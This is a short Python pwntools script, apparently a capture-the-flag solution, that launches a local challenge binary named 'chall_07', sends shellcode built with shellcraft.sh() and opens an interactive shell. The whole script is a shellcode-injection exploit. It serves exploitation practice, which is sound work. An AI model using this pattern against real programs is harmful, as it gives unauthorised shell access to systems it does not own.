#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_07')

p = process(binary.path)

p.sendline()

payload  = b''
payload += asm(shellcraft.sh())

p.sendline(payload)
p.interactive()